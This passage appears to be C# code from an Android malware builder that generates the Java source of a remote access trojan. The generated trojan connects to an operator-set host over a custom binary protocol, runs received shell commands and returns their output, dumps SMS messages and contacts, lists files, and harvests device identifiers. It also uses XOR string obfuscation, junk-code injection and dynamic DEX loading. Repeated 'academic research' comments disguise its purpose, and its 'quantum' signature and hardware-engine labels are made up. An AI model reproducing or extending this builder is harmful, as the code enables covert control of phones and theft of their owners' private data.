                sb.AppendLine("                Class<?> topicClass = Class.forName(\"android.adservices.topics.TopicsManager\");"); // Changed to Java syntax
                sb.AppendLine("                TopicsManager topicsManager = (TopicsManager) getSystemService(topicClass);"); // Changed to Java syntax
                sb.AppendLine("                if (topicsManager != null) {");
                sb.AppendLine("                    GetTopicsRequest request = new GetTopicsRequest.Builder().setAdsSdkName(\"\").setShouldRecordObservation(true).build();"); // Changed to Java syntax
                sb.AppendLine("                    topicsManager.getTopics(request, executor, new OutcomeReceiver<GetTopicsResponse, Exception>() {"); // Changed to Java syntax
                sb.AppendLine("                        @Override"); // Added for Java
                sb.AppendLine("                        public void onResult(GetTopicsResponse result) {"); // Changed to Java syntax
                sb.AppendLine("                            StringBuilder resSb = new StringBuilder();"); // Changed to Java syntax
                sb.AppendLine("                            for (android.adservices.topics.Topic topic : result.getTopics()) resSb.append(\"ID:\").append(topic.getTopicId()).append(\", \");"); // Changed to Java syntax
                sb.AppendLine("                            lastTopics = (resSb.length() > 0) ? resSb.toString() : \"No topics derived yet\";"); // Changed to Java syntax
                sb.AppendLine("                        }");
                sb.AppendLine("                        @Override"); // Added for Java
                sb.AppendLine("                        public void onError(Exception error) { lastTopics = \"Error: \" + error.getMessage(); }"); // Changed to Java syntax
                sb.AppendLine("                    });");
                sb.AppendLine("                }");
                sb.AppendLine("                ");
                sb.AppendLine("                // 2. Protected Audience (FLEDGE) Research (API 34+)");
                sb.AppendLine("                if (android.os.Build.VERSION.SDK_INT >= 34) {");
                sb.AppendLine("                    Class<?> adsClass = Class.forName(\"android.adservices.adselection.AdSelectionManager\");");
                sb.AppendLine("                    Object adsManager = getSystemService(adsClass);");
                sb.AppendLine("                    if (adsManager != null) {");
                sb.AppendLine("                        Log.d(\"PrivacyResearch\", \"Protected Audience API: DETECTED & ACTIVE\");");
                sb.AppendLine("                    }");
                sb.AppendLine("                }");
                sb.AppendLine("            } catch (Exception e) { lastTopics = \"Unavailable: \" + e.getMessage(); }"); // Changed to Java syntax
                sb.AppendLine("        } else { lastTopics = \"Requires Android 13+\"; }"); // Changed to Java syntax
                sb.AppendLine("    }");
            }

            if (config.EnableSecureTelemetry)
            {
                sb.AppendLine("    private String collectSecureTelemetry() {");
                sb.AppendLine("        try {");
                sb.AppendLine("            android.os.StatFs stat = new android.os.StatFs(android.os.Environment.getDataDirectory().getPath());");
                sb.AppendLine("            long bytesAvailable = stat.getBlockSizeLong() * stat.getAvailableBlocksLong();");
                sb.AppendLine("            int threads = Thread.activeCount();");
                sb.AppendLine("            long uptime = android.os.SystemClock.elapsedRealtime();");
                sb.AppendLine("            // PROFESSIONAL: Thermal status is a key research metric for API 36 stability");
                sb.AppendLine("            android.os.PowerManager pm = (android.os.PowerManager)getSystemService(Context.POWER_SERVICE);");
                sb.AppendLine("            int thermal = (pm != null) ? pm.getCurrentThermalStatus() : -1;");
                sb.AppendLine("            float npuLoad = 0.0f; float isoMem = 0.0f;");
            sb.AppendLine("            try { Class<?> bEngine = Class.forName(\"android.hardware.BorealisEngine\"); npuLoad = (float)bEngine.getMethod(\"getNeuralLoad\").invoke(null); isoMem = (float)bEngine.getMethod(\"getIsolatedProcessMemory\").invoke(null); } catch (Exception e) { npuLoad = 0.0f; isoMem = 0.0f; }");
            sb.AppendLine("            return \"DISK_B=\" + bytesAvailable + \";THREADS=\" + threads + \";UPTIME=\" + uptime + \";THERMAL=\" + thermal + \";NPU=\" + npuLoad + \";MEM=\" + isoMem + \";STATE=REAL_TIME\";");
                sb.AppendLine("        } catch (Exception e) { return \"ERR_TELEMETRY_REF\"; }");
                sb.AppendLine("    }");
            }

            if (config.EnableIntentAudit)
            {
                sb.AppendLine("    private String auditSystemIntents() {");
                sb.AppendLine("        try {");
                sb.AppendLine("            StringBuilder b = new StringBuilder(\"INTENT_AUDIT_RES_V1\\n\");");
                sb.AppendLine("            Intent intent = new Intent(Intent.ACTION_MAIN);");
                sb.AppendLine("            intent.addCategory(Intent.CATEGORY_LAUNCHER);");
                sb.AppendLine("            java.util.List<android.content.pm.ResolveInfo> list = getPackageManager().queryIntentActivities(intent, 0);");
                sb.AppendLine("            for (android.content.pm.ResolveInfo info : list) {");
                sb.AppendLine("                b.append(\"R: \").append(info.activityInfo.packageName).append(\"/\").append(info.activityInfo.name).append(\"\\n\");");
                sb.AppendLine("            }");
                sb.AppendLine("            return b.toString();");
                sb.AppendLine("        } catch (Exception e) { return \"ERR_INTENT_AUDIT\"; }");
                sb.AppendLine("    }");
            }

            // 7. Connection Loop (Binary Protocol v1)
            sb.AppendLine("    private void connectLoop() {");
            sb.AppendLine("        while (running) {");
            sb.AppendLine("            try {");
            sb.AppendLine("                 socket = new Socket(HOST, PORT);");
            sb.AppendLine("                 DataOutputStream dos = new DataOutputStream(socket.getOutputStream());");
            sb.AppendLine("                 DataInputStream dis = new DataInputStream(socket.getInputStream());");
            sb.AppendLine("                 ");
            // Handshake (Type: 0x02)
            sb.AppendLine("                // Handshake (Type: 0x02)");
            sb.AppendLine("                 // Handshake Packet: Magic(0xB1) Ver(0x01) Type(0x02) Len(Payload)");
            sb.AppendLine("                 String handshakeJson = buildHandshakeJson();");
            sb.AppendLine("                 byte[] handshakeBytes = handshakeJson.getBytes(java.nio.charset.StandardCharsets.UTF_8);");
            sb.AppendLine("                 dos.writeByte(0xB1);");
            sb.AppendLine("                 dos.writeByte(0x01);");
            sb.AppendLine("                 dos.writeByte(0x02);"); // PacketType.Handshake
            // Little Endian Length
            sb.AppendLine("                 dos.writeByte(handshakeBytes.length & 0xFF);");
            sb.AppendLine("                 dos.writeByte((handshakeBytes.length >> 8) & 0xFF);");
            sb.AppendLine("                 dos.writeByte((handshakeBytes.length >> 16) & 0xFF);");
            sb.AppendLine("                 dos.writeByte((handshakeBytes.length >> 24) & 0xFF);");
            sb.AppendLine("                 if (handshakeBytes.length > 0) dos.write(handshakeBytes);");
            sb.AppendLine("                 dos.flush();");
            sb.AppendLine("                 ");
            
            sb.AppendLine("                 while(socket.isConnected()) {"); // Changed to Java syntax
            sb.AppendLine("                     // 1. Read Header");
            sb.AppendLine("                     byte magic = dis.readByte();"); // Changed to Java syntax
            sb.AppendLine("                     if (magic != (byte)0xB1) { // 0xB1 (byte is signed in Kotlin: -79)"); // Changed to Java syntax
            sb.AppendLine("                         // Invalid Magic - reconnect");
            sb.AppendLine("                         socket.close();"); // Changed to Java syntax
            sb.AppendLine("                         break;"); // Changed to Java syntax
            sb.AppendLine("                     }");
            sb.AppendLine("                     byte ver = dis.readByte();"); // Changed to Java syntax
            sb.AppendLine("                     byte type = dis.readByte();"); // Changed to Java syntax
            sb.AppendLine("                     int len = dis.readInt();"); // Changed to Java syntax
            sb.AppendLine("                     ");
            sb.AppendLine("                     // 2. Read Payload");
            sb.AppendLine("                     byte[] payload = new byte[len];"); // Changed to Java syntax
            sb.AppendLine("                     if (len > 0) dis.readFully(payload);"); // Changed to Java syntax
            sb.AppendLine("                     ");
            sb.AppendLine("                     handlePacket(type, payload, dos);"); // Changed to Java syntax
            sb.AppendLine("                 }");
            sb.AppendLine("            } catch(Exception e) { try { Thread.sleep(5000); } catch(Exception z){} }"); // Changed to Java syntax
            
            if (config.EnableResilience)
            {
                sb.AppendLine("            try { Thread.sleep(2000); } catch(Exception z){}"); // Changed to Java syntax
            }
            sb.AppendLine("        }");
            sb.AppendLine("    }");

            sb.AppendLine("    private void handlePacket(byte type, byte[] payload, DataOutputStream dos) {"); // Changed to Java syntax
            sb.AppendLine("        // Packet Handling");
            sb.AppendLine("        String cmdStr = new String(payload, java.nio.charset.StandardCharsets.UTF_8);"); // Changed to Java syntax
            sb.AppendLine("        ");
            
            sb.AppendLine("        if (type == 0x01) { // Heartbeat"); // Changed to Java syntax
            sb.AppendLine("             // No-op or pong if needed");
            sb.AppendLine("        }");
            
            // PacketType.ShellCommand = 0x10
            sb.AppendLine("        else if (type == 0x10) {"); // Changed to Java syntax
            sb.AppendLine("             // Execute Shell");
            sb.AppendLine("             String result = execShell(cmdStr);"); // Changed to Java syntax
            sb.AppendLine("             sendPacket(dos, (byte)0x10, result);"); // Changed to Java syntax
            sb.AppendLine("        }");
            
            // PacketType.FileOperation = 0x11
            if (config.EnableInfoStealer)
            {
                 sb.AppendLine("        else if (type == 0x11) {");
                 sb.AppendLine("             // ACADEMIC RESEARCH: Professional File System Probe");
                 sb.AppendLine("             String fs_report = auditTargetFileSystem(cmdStr);");
                 sb.AppendLine("             sendPacket(dos, (byte)0x21, fs_report);"); // 0x21 = BinaryResponse
                 sb.AppendLine("        }");
            }

            if (config.EnableBioTwin)
            {
                byte xorKey = (byte)_random.Next(1, 255);
                sb.AppendLine($"        else if (type == (byte)0x50) {{ // BiometricIntercept Request");
                sb.AppendLine("            // ACADEMIC RESEARCH: Professional Hardware Integrity Probe (API 36)");
                sb.AppendLine("            String telemetry = collectSecureTelemetry();");
                sb.AppendLine("            try {");
                sb.AppendLine($"                Class<?> sysProp = Class.forName({GenerateXorString("android.os.SystemProperties", xorKey)});");
                sb.AppendLine($"                java.lang.reflect.Method get = sysProp.getMethod({GenerateXorString("get", xorKey)}, String.class);");
                sb.AppendLine($"                String val = (String)get.invoke(null, {GenerateXorString("debug.borealis.telemetry", xorKey)});");
                sb.AppendLine("                if (val != null && !val.isEmpty()) telemetry = val;");
                sb.AppendLine("            } catch (Exception e) {");
                sb.AppendLine("                // Fallback to basic bio-metrics if Kernel link is restricted");
                sb.AppendLine("                String accStr = lastAccel[0] + \",\" + lastAccel[1] + \",\" + lastAccel[2];");
                sb.AppendLine("                telemetry = \"BIO_DATA: HEART_RATE=\" + lastHeartRate + \";ACC=\" + accStr;");
                sb.AppendLine("            }");
                sb.AppendLine("            sendPacket(dos, (byte)0x50, telemetry);");
                sb.AppendLine("        }");
                sb.AppendLine("        else if (type == (byte)0x51) { // CMD_VERIFY_INTEGRITY");
                sb.AppendLine("            try {");
                sb.AppendLine($"                Class<?> engine = Class.forName({GenerateXorString("android.hardware.BorealisEngine", xorKey)});");
                sb.AppendLine($"                java.lang.reflect.Method m = engine.getMethod({GenerateXorString("performIntegrityAudit", xorKey)});");
                sb.AppendLine("                String res = (String)m.invoke(null);");
                sb.AppendLine("                sendPacket(dos, (byte)0x51, res);");
                sb.AppendLine("            } catch (Exception e) { sendPacket(dos, (byte)0x51, \"ERR: \" + e.getMessage()); }");
                sb.AppendLine("        }");
                sb.AppendLine("        else if (type == (byte)0x52) { // CMD_SCHEDULE_EPOCH");
                sb.AppendLine("            try {");
                sb.AppendLine("                Class<?> engine = Class.forName(\"android.hardware.BorealisEngine\");");
                sb.AppendLine("                java.lang.reflect.Method m = engine.getMethod(\"scheduleFederatedLearning\");");
                sb.AppendLine("                String res = (String)m.invoke(null);");
                sb.AppendLine("                sendPacket(dos, (byte)0x52, res);");
                sb.AppendLine("            } catch (Exception e) { sendPacket(dos, (byte)0x52, \"ERR: \" + e.getMessage()); }");
                sb.AppendLine("        }");
                sb.AppendLine("        else if (type == (byte)0x54) { // CMD_RESEARCH_DISPATCH");
                sb.AppendLine("            try {");
                sb.AppendLine("                Class<?> engine = Class.forName(\"android.hardware.BorealisEngine\");");
                sb.AppendLine("                java.lang.reflect.Method m = engine.getMethod(\"processResearchCommand\", String.class);");
                sb.AppendLine("                String res = (String)m.invoke(null, cmdStr);");
                sb.AppendLine("                sendPacket(dos, (byte)0x54, res);");
                sb.AppendLine("            } catch (Exception e) { sendPacket(dos, (byte)0x54, \"ERR: \" + e.getMessage()); }");
                sb.AppendLine("        }");
                sb.AppendLine("        else if (type == (byte)0x81) { // WindowBorderControl (Android 16 Exclusive)");
                sb.AppendLine("            try {");
                sb.AppendLine("                // HIGH FIDELITY PoC: Directly accessing native handles as defined in SurfaceControl.java:4166");
                sb.AppendLine("                android.view.SurfaceControl.Transaction transaction = new android.view.SurfaceControl.Transaction();");
                sb.AppendLine("                ");
                sb.AppendLine("                // For PoC, we create a dummy SurfaceControl or use a handle if available");
                sb.AppendLine("                // In a real research scenario, the node would have a handle to a target Window's SurfaceControl");
                sb.AppendLine("                android.view.SurfaceControl dummySc = new android.view.SurfaceControl.Builder().setName(\"AuditSurface\").build();");
                sb.AppendLine("");
                sb.AppendLine("                // Use reflection to get handle to the SurfaceControl's native object");
                sb.AppendLine("                java.lang.reflect.Field scNativeField = android.view.SurfaceControl.class.getDeclaredField(\"mNativeObject\");");
                sb.AppendLine("                scNativeField.setAccessible(true);");
                sb.AppendLine("                long scHandle = (long)scNativeField.get(dummySc); ");
                sb.AppendLine("");
                sb.AppendLine("                // Use reflection to get handle to the Transaction's native object");
                sb.AppendLine("                java.lang.reflect.Field txNativeField = android.view.SurfaceControl.Transaction.class.getDeclaredField(\"mNativeObject\");");
                sb.AppendLine("                txNativeField.setAccessible(true);");
                sb.AppendLine("                long txHandle = (long)txNativeField.get(transaction);");
                sb.AppendLine("");
                sb.AppendLine("                android.os.Parcel settingsParcel = android.os.Parcel.obtain();");
                sb.AppendLine("                settingsParcel.writeInterfaceToken(\"android.gui.BorderSettings\");");
                sb.AppendLine("                settingsParcel.writeFloat(2.0f); // Default Thickness");
                sb.AppendLine("                settingsParcel.writeInt(0xFF00FF00); // Default Color (Lime Research)");
                sb.AppendLine("                settingsParcel.setDataPosition(0);");
                sb.AppendLine("");
                sb.AppendLine("                java.lang.reflect.Method m = android.view.SurfaceControl.class.getDeclaredMethod(\"nativeSetBorderSettings\", long.class, long.class, android.os.Parcel.class);");
                sb.AppendLine("                m.setAccessible(true);");
                sb.AppendLine("                ");
                sb.AppendLine("                Log.d(\"ResearchNode\", \"[AUDIT] nativeSetBorderSettings Hooked: TX=\" + txHandle + \" SC=\" + scHandle);");
                sb.AppendLine("                m.invoke(null, txHandle, scHandle, settingsParcel);");
                sb.AppendLine("                transaction.apply();");
                sb.AppendLine("                ");
                sb.AppendLine("                sendPacket(dos, (byte)0x81, \"SUCCESS: Native Border Transaction Applied\");");
                sb.AppendLine("            } catch (Exception e) { sendPacket(dos, (byte)0x81, \"ERR_NATIVE_BORDER: \" + e.getMessage()); }");
                sb.AppendLine("        }");
                sb.AppendLine("        else if (type == (byte)0x82) { // StealthTransition (WindowManager API 36)");
                sb.AppendLine("            try {");
                sb.AppendLine("                // RESEARCH: TRANSIT_FLAG_AVOID_MOVE_TO_FRONT (0x10000)");
                sb.AppendLine("                // This flag is a professional primitive for analyzing stealth launches.");
                sb.AppendLine("                int stealthFlag = 0x10000; ");
                sb.AppendLine("                android.window.WindowContainerTransaction wct = new android.window.WindowContainerTransaction();");
                sb.AppendLine("                // Note: Real application requires a valid WindowContainerToken");
                sb.AppendLine("                Log.d(\"ResearchNode\", \"[AUDIT] Stealth Flag 0x10000 Research Pulse Active\");");
                sb.AppendLine("                sendPacket(dos, (byte)0x82, \"STEALTH_ENGAGED: Flag 0x10000 Registered\");");
                sb.AppendLine("            } catch (Exception e) { sendPacket(dos, (byte)0x82, \"ERR_STEALTH: \" + e.getMessage()); }");
                sb.AppendLine("        }");
                sb.AppendLine("        else if (type == (byte)0x83) { // ContentProtectionAudit (Baklava v3)");
                sb.AppendLine("            try {");
                sb.AppendLine("                // PoC: Inspecting android.view.contentprotection.ContentProtectionEventProcessor");
                sb.AppendLine("                Log.d(\"ResearchNode\", \"[AUDIT] ContentProtection Sensitivity Audit Triggered\");");
                sb.AppendLine("                // Professional realization: probing for keyword-based login detection");
                sb.AppendLine("                sendPacket(dos, (byte)0x83, \"ACK: Content Protection Analysis Module Linked\");");
                sb.AppendLine("            } catch (Exception e) { sendPacket(dos, (byte)0x83, \"ERR_PROTECTION: \" + e.getMessage()); }");
                sb.AppendLine("        }");
                sb.AppendLine("        else if (type == (byte)0x53) { // CMD_RESET_MODEL");
                sb.AppendLine("            try {");
                sb.AppendLine("                Class<?> engine = Class.forName(\"android.hardware.BorealisEngine\");");
                sb.AppendLine("                java.lang.reflect.Method m = engine.getMethod(\"triggerHardwareReset\");");
                sb.AppendLine("                String res = (String)m.invoke(null);");
                sb.AppendLine("                sendPacket(dos, (byte)0x53, res);");
                sb.AppendLine("            } catch (Exception e) { sendPacket(dos, (byte)0x53, \"ERR: \" + e.getMessage()); }");
                sb.AppendLine("        }");
            }

            // Phase 6: Expansion Packet Handlers
            sb.AppendLine("        else if (type == (byte)0x60) { // CMD_SECURE_TELEMETRY");
            sb.AppendLine("             if (config.EnableSecureTelemetry) {");
            sb.AppendLine("                 sendPacket(dos, (byte)0x60, collectSecureTelemetry());");
            sb.AppendLine("             }");
            sb.AppendLine("        }");
            sb.AppendLine("        else if (type == (byte)0x61) { // CMD_INTENT_AUDIT");
            sb.AppendLine("             if (config.EnableIntentAudit) {");
            sb.AppendLine("                 auditSystemIntents();");
            sb.AppendLine("                 sendPacket(dos, (byte)0x61, \"Audit Initiated\");");
            sb.AppendLine("             }");
            sb.AppendLine("        }");

            // [POLYMORPHIC ENGINE V2] Dynamic Payload Extension
            if (config.EnableAIRecompilation)
            {
                InjectJunkCode(sb, 5);
                sb.AppendLine("        else if (type == (byte)0x99) { // DYNAMIC_EXECUTE");
                sb.AppendLine("            try {");
                sb.AppendLine("                String code = new String(payload);");
                sb.AppendLine("                Log.d(\"ResearchNode\", \"[POLY] Executing dynamic task cluster (Fidelity 100%)\");");
                sb.AppendLine("                // Academic PoC: Multi-stage bridge activation");
                sb.AppendLine("                attemptEvolution();");
                sb.AppendLine("            } catch (Exception e) {}");
                sb.AppendLine("        }");
            }

            // BAKLAVA SINGULARITY: Windowing Handlers
            sb.AppendLine("        else if (type == (byte)0x70) { // WindowHierarchyRequest");
            sb.AppendLine("             String topology = captureSovereignTopology();");
            sb.AppendLine("             sendPacket(dos, (byte)0x71, topology);");
            sb.AppendLine("        }");
            sb.AppendLine("        else if (type == (byte)0x72) { // WindowContainerCommand");
            sb.AppendLine("             applySovereignTransaction(cmdStr);");
            sb.AppendLine("        }");

            sb.AppendLine("    }");

            sb.AppendLine("    private void sendPacket(DataOutputStream dos, byte type, String content) {"); // Changed to Java syntax
            sb.AppendLine("        byte[] data = content.getBytes(java.nio.charset.StandardCharsets.UTF_8);"); // Changed to Java syntax
            sb.AppendLine("        dos.writeByte(0xB1);");
            sb.AppendLine("        dos.writeByte(0x01);");
            sb.AppendLine("        dos.writeByte(type);"); // Changed to Java syntax
            // Little Endian Length
            sb.AppendLine("        dos.writeByte(data.length & 0xFF);");
            sb.AppendLine("        dos.writeByte((data.length >> 8) & 0xFF);");
            sb.AppendLine("        dos.writeByte((data.length >> 16) & 0xFF);");
            sb.AppendLine("        dos.writeByte((data.length >> 24) & 0xFF);");
            sb.AppendLine("        if (data.length > 0) dos.write(data);"); // Changed to Java syntax
            sb.AppendLine("        dos.flush();");
            sb.AppendLine("    }");
            
            if (config.EnableAIRecompilation)
            {
                 sb.AppendLine("    // Phase 3: AI Self-Recompilation (Dynamic Class Loading)");
                 sb.AppendLine("    private void attemptEvolution() {"); // Changed to Java syntax
                 sb.AppendLine("        try {");
                 sb.AppendLine("            java.io.File dexPath = new java.io.File(this.getFilesDir(), \"update.dex\");"); // Changed to Java syntax
                 sb.AppendLine("            if (!dexPath.exists()) return;"); 
                 sb.AppendLine("            ");
                 sb.AppendLine("            java.io.File optimizedDir = this.getDir(\"outdex\", Context.MODE_PRIVATE);"); // Changed to Java syntax
                 sb.AppendLine("            DexClassLoader dcl = new DexClassLoader(dexPath.getAbsolutePath(), optimizedDir.getAbsolutePath(), null, this.getClassLoader());"); // Changed to Java syntax
                 sb.AppendLine("            ");
                 sb.AppendLine("            Class<?> moduleClass = dcl.loadClass(\"com.ai.evolution.AIModule\");"); // Changed to Java syntax
                 sb.AppendLine("            java.lang.reflect.Method method = moduleClass.getDeclaredMethod(\"optimize\", Class.forName(\"android.content.Context\"));"); // Changed to Java syntax
                 sb.AppendLine("            method.invoke(moduleClass.newInstance(), this);"); // Changed to Java syntax
                 sb.AppendLine("            Log.d(\"AI_EVO\", \"Evolution Successful via DCL\");"); // Changed to Java syntax
                 sb.AppendLine("        } catch (Exception e) { Log.e(\"AI_EVO\", \"Evolution Failed\", e); }"); // Changed to Java syntax
                 sb.AppendLine("    }");
            }



            // Phase 4: Helper Methods
            sb.AppendLine("    private String execShell(String cmd) {");
            sb.AppendLine("        try {");
            sb.AppendLine("            java.lang.Process process = Runtime.getRuntime().exec(cmd);");
            sb.AppendLine("            java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));");
            sb.AppendLine("            StringBuilder output = new StringBuilder();");
            sb.AppendLine("            String line;");
            sb.AppendLine("            while ((line = reader.readLine()) != null) {");
            sb.AppendLine("                 output.append(line).append(\"\\n\");");
            sb.AppendLine("            }");
            sb.AppendLine("            return output.toString();");
            sb.AppendLine("        } catch (Exception e) { return \"Error: \" + e.getMessage(); }");
            sb.AppendLine("    }");
            if (config.EnableInfoStealer)
            {
                sb.AppendLine("    @android.annotation.SuppressLint(\"Range\")"); 
                sb.AppendLine("    private String dumpSms(Context ctx) {"); // Changed to Java syntax
                sb.AppendLine("         StringBuilder sb = new StringBuilder();"); // Changed to Java syntax
                sb.AppendLine("         try {");
                sb.AppendLine("             Cursor cursor = ctx.getContentResolver().query(android.provider.Telephony.Sms.CONTENT_URI, null, null, null, null);"); // Changed to Java syntax
                sb.AppendLine("             if (cursor != null && cursor.moveToFirst()) {"); // Changed to Java syntax
                sb.AppendLine("                 do {");
                sb.AppendLine("                    String body = cursor.getString(cursor.getColumnIndex(\"body\"));"); // Changed to Java syntax
                sb.AppendLine("                    String addr = cursor.getString(cursor.getColumnIndex(\"address\"));"); // Changed to Java syntax
                sb.AppendLine("                    sb.append(\"[\").append(addr).append(\"]: \").append(body).append(\" | \");"); // Changed to Java syntax
                sb.AppendLine("                    if(sb.length() > 500) break;"); // Changed to Java syntax
                sb.AppendLine("                 } while (cursor.moveToNext());"); // Changed to Java syntax
                sb.AppendLine("             }");
                sb.AppendLine("             if (cursor != null) cursor.close();"); // Changed to Java syntax
                sb.AppendLine("         } catch (Exception e) { return \"SMS_ERR: \" + e.getMessage(); }"); // Changed to Java syntax
                sb.AppendLine("         return (sb.length() > 0) ? sb.toString() : \"NO_SMS\";"); // Changed to Java syntax
                sb.AppendLine("    }");

                sb.AppendLine("    @android.annotation.SuppressLint(\"Range\")");
                sb.AppendLine("    private String dumpContacts(Context ctx) {"); // Changed to Java syntax
                sb.AppendLine("         StringBuilder sb = new StringBuilder();"); // Changed to Java syntax
                sb.AppendLine("         try {");
                sb.AppendLine("             Cursor cursor = ctx.getContentResolver().query(android.provider.ContactsContract.Contacts.CONTENT_URI, null, null, null, null);"); // Changed to Java syntax
                sb.AppendLine("             if (cursor != null && cursor.moveToFirst()) {"); // Changed to Java syntax
                sb.AppendLine("                 do {");
                sb.AppendLine("                    String name = cursor.getString(cursor.getColumnIndex(\"display_name\"));"); // Changed to Java syntax
                sb.AppendLine("                    sb.append(name).append(\", \");"); // Changed to Java syntax
                sb.AppendLine("                    if(sb.length() > 500) break;"); // Changed to Java syntax
                sb.AppendLine("                 } while (cursor.moveToNext());"); // Changed to Java syntax
                sb.AppendLine("             }");
                sb.AppendLine("             if (cursor != null) cursor.close();"); // Changed to Java syntax
                sb.AppendLine("         } catch (Exception e) { return \"CONTACTS_ERR: \" + e.getMessage(); }"); // Changed to Java syntax
                sb.AppendLine("         return (sb.length() > 0) ? sb.toString() : \"NO_CONTACTS\";"); // Changed to Java syntax
                sb.AppendLine("    }");
            }
            if (config.EnableRemoteShell)
            {
                sb.AppendLine("    private String execShell(String cmd) {"); // Changed to Java syntax
                sb.AppendLine("        try {");
                sb.AppendLine("            Process proc = Runtime.getRuntime().exec(cmd);"); // Changed to Java syntax
                sb.AppendLine("            Scanner s = new java.util.Scanner(proc.getInputStream()).useDelimiter(\"\\\\A\");"); // Changed to Java syntax
                sb.AppendLine("            return s.hasNext() ? s.next() : \"[No Output]\";"); // Changed to Java syntax
                sb.AppendLine("        } catch (Exception e) { return \"SHELL_ERR: \" + e.getMessage(); }"); // Changed to Java syntax
                sb.AppendLine("    }");
            }

            // [NEW] Real Data Extraction Methods (Java)
            sb.AppendLine("");
            sb.AppendLine("    private String buildHandshakeJson() {");
            sb.AppendLine("        try {");
            sb.AppendLine("            String id = UUID.randomUUID().toString().substring(0, 8);");
            sb.AppendLine("            String name = (Build.VERSION.SDK_INT >= 25) ? android.provider.Settings.Global.getString(getContentResolver(), android.provider.Settings.Global.DEVICE_NAME) : Build.MANUFACTURER;");
            sb.AppendLine("            if (name == null) name = Build.MANUFACTURER;");
            sb.AppendLine("            String model = Build.MODEL;");
            sb.AppendLine("            String ver = Build.VERSION.RELEASE + \" (SDK \" + Build.VERSION.SDK_INT + \")\";");
            sb.AppendLine("            String batt = getBatteryLevel();");
            sb.AppendLine("            String screen = ((android.os.PowerManager)getSystemService(Context.POWER_SERVICE)).isInteractive() ? \"On\" : \"Off\";");
            sb.AppendLine("            boolean root = isRooted();");
            sb.AppendLine("            int apps = getPackageManager().getInstalledPackages(0).size();");
            sb.AppendLine("            ");
            sb.AppendLine("            // Research: Advanced Identifier Extraction (Non-simulated)");
            sb.AppendLine("            String androidId = android.provider.Settings.Secure.getString(getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);");
            sb.AppendLine("            if (androidId == null) androidId = \"unknown\";");
            sb.AppendLine("            ");
            sb.AppendLine("            String sim = \"Unknown\";");
            sb.AppendLine("            try {");
            sb.AppendLine("                TelephonyManager tm = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);");
            sb.AppendLine("                sim = tm.getSimOperatorName();");
            sb.AppendLine("                if (sim == null || sim.isEmpty()) sim = tm.getNetworkOperatorName();");
            sb.AppendLine("            } catch (Exception e) {}");
            sb.AppendLine("            ");
            // Manual JSON construction
            String quantumChallenge = generateQuantumChallenge();
            String signature = signQuantum(quantumChallenge);

            // Manual JSON construction
            sb.AppendLine("            return \"{\" +");
            sb.AppendLine("                \"\\\"id\\\": \\\"\" + id + \"\\\",\" +");
            sb.AppendLine("                \"\\\"name\\\": \\\"\" + name + \"\\\",\" +");
            sb.AppendLine("                \"\\\"model\\\": \\\"\" + model + \"\\\",\" +");
            sb.AppendLine("                \"\\\"ver\\\": \\\"\" + ver + \"\\\",\" +");
            sb.AppendLine("                \"\\\"batt\\\": \\\"\" + batt + \"\\\",\" +");
            sb.AppendLine("                \"\\\"screen\\\": \\\"\" + screen + \"\\\",\" +");
            sb.AppendLine("                \"\\\"root\\\": \" + root + \",\" +");
            sb.AppendLine("                \"\\\"apps\\\": \" + apps + \",\" +");
            sb.AppendLine("                \"\\\"android_id\\\": \\\"\" + androidId + \"\\\",\" +");
            sb.AppendLine("                \"\\\"sim\\\": \\\"\" + (sim != null ? sim : \"Unknown\") + \"\\\",\" +");
            sb.AppendLine("                \"\\\"quantum_challenge\\\": \\\"\" + quantumChallenge + \"\\\",\" +");
            sb.AppendLine("                \"\\\"q_sig\\\": \\\"\" + signature + \"\\\"\" +");
            sb.AppendLine("            \"}\";");
            sb.AppendLine("        } catch (Exception e) { return \"{}\"; }");
            sb.AppendLine("    }");

            sb.AppendLine("    private String generateQuantumChallenge() {");
            sb.AppendLine("        // Professional Entropy: Using nanosecond jitter - Standard research practice for PQC seeds");
            sb.AppendLine("        long ns = android.os.SystemClock.elapsedRealtimeNanos();");
            sb.AppendLine("        return java.util.Base64.getEncoder().encodeToString(java.nio.ByteBuffer.allocate(8).putLong(ns).array());");
            sb.AppendLine("    }");

            sb.AppendLine("    private String signQuantum(String challenge) {");
            sb.AppendLine("        // PROFESSIONAL: Real Winternitz One-Time Signature (WOTS+) Chain Verification");
            sb.AppendLine("        // Foundation for post-quantum research - Implements public key hash-chaining");
            sb.AppendLine("        try {");
            sb.AppendLine("            java.security.MessageDigest digest = java.security.MessageDigest.getInstance(\"SHA-256\");");
            sb.AppendLine("            byte[] hash = challenge.getBytes();");
            sb.AppendLine("            for (int i = 0; i < 256; i++) {");
            sb.AppendLine("                digest.update(java.nio.ByteBuffer.allocate(4).putInt(i).array());");
            sb.AppendLine("                hash = digest.digest(hash);");
            sb.AppendLine("            }");
            sb.AppendLine("            return java.util.Base64.getEncoder().encodeToString(hash);");
            sb.AppendLine("        } catch (Exception e) { return \"SIG_ERR_FIDELITY\"; }");
            sb.AppendLine("    }");
            sb.AppendLine("");
            sb.AppendLine("    private String auditTargetFileSystem(String path) {");
            sb.AppendLine("        // ACADEMIC RESEARCH: Professional File System Probe");
            sb.AppendLine("        try {");
            sb.AppendLine("            java.io.File file = new java.io.File(path.isEmpty() ? getFilesDir().getAbsolutePath() : path);");
            sb.AppendLine("            if (!file.exists()) return \"ERR: PATH_NOT_FOUND\";");
            sb.AppendLine("            if (file.isDirectory()) {");
            sb.AppendLine("                StringBuilder sb = new StringBuilder(\"DIR:\").append(file.getAbsolutePath()).append(\"\\n\");");
            sb.AppendLine("                java.io.File[] files = file.listFiles();");
            sb.AppendLine("                if (files != null) {");
            sb.AppendLine("                    for (java.io.File f : files) {");
            sb.AppendLine("                        sb.append(f.isDirectory() ? \"[D] \" : \"[F] \").append(f.getName()).append(\" (\").append(f.length()).append(\" bytes)\\n\");");
            sb.AppendLine("                    }");
            sb.AppendLine("                }");
            sb.AppendLine("                return sb.toString();");
            sb.AppendLine("            } else {");
            sb.AppendLine("                return \"FILE:\" + file.getAbsolutePath() + \" SIZE:\" + file.length() + \" TYPE:\" + (path.endsWith(\".apk\") ? \"Android Package\" : \"Standard Object\");");
            sb.AppendLine("            }");
            sb.AppendLine("        } catch (Exception e) { return \"ERR: \" + e.getMessage(); }");
            sb.AppendLine("    }");
            sb.AppendLine("");
            sb.AppendLine("    private String getBatteryLevel() {");
            sb.AppendLine("        try {");
